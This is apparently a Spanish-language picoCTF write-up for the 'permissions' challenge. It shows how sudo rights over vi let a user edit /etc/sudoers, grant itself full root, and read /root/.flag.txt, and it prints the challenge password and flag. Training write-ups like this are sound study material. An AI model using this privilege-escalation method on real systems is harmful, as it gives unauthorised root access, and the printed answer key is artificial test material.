# 1 - permissions

## Descripcion:
* Can you read files in the root file? The system admin has provisioned an account for you on the main server: ssh -p 52733 picoplayer@saturn.picoctf.net Password: j4ks-9nxB-Can you login and read the root file?

## Solucion:
* ssh -p 51163 picoplayer@saturn.picoctf.net
* yes
* j4ks-9nxB-
* sudo -l
* j4ks-9nxB-
* cd /
* ls -l
* cd etc
* ls
* sudo vi sudoers
* picoplayer ALL=(ALL:ALL) ALL
* esc:
* wq!
* sudo -l
* sudo ls -a /root
* sudo cat /root/.flag.txt
* picoCTF{uS1ng_v1m_3dit0r_021d10ab}

## Notas:
* ssh -p 51163 picoplayer@saturn.picoctf.net
* Se conecta al servidor por SSH usando el puerto 51163.
* yes
* Acepta la clave del servidor (primera conexión).
* j4ks-9nxB-
* Contraseña del usuario picoplayer.
* sudo -l
* Muestra qué comandos puedes ejecutar con sudo (descubres que puedes usar vi como root).
* cd /
* Navega al directorio raíz del sistema.
* ls -l
* Lista archivos y directorios con detalles de permisos.
* cd etc
* Entra al directorio /etc/ (donde está sudoers).
* ls
* Lista archivos en /etc/ (buscas sudoers).
* sudo vi sudoers
* Abre el archivo sudoers con vi como root para editarlo.
* picoplayer ALL=(ALL:ALL) ALL
* Línea que agregas en sudoers para darte permisos totales de sudo.
* ESC :
* wq!
* En vi: sale del modo inserción (ESC), guarda y fuerza la salida (:wq!).
* sudo -l
* Verifica que ahora tienes permisos completos de sudo.
* sudo ls -a /root
* Lista archivos ocultos en el directorio /root/ (donde está la flag).
* sudo cat /root/.flag.txt
* Lee la flag oculta en /root/.flag.txt.
* tenemos la bandera

## Referencias: